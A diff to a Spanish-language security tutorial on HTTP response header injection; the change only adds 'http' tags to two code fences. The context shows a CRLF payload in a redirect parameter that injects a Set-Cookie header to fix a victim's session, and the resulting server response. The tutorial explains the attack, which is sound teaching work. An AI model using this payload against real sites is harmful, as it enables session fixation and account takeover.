@@ -29,12 +29,12 @@ El objetivo es agregar **una** cabecera propia, no partir la respuesta entera ‚Ä
 
 Las cabeceras se separan con `\r\n`. Si el valor reflejado no filtra esa secuencia, inyectarla cierra la cabecera actual y empieza una nueva:
 
-```
+```http
 GET /redir?url=/inicio%0d%0aSet-Cookie:%20sesion=fijada HTTP/1.1
 ```
 
 Respuesta:
-```
+```http
 HTTP/1.1 302 Found
 Location: /inicio
 Set-Cookie: sesion=fijada        ‚Üê inyectada
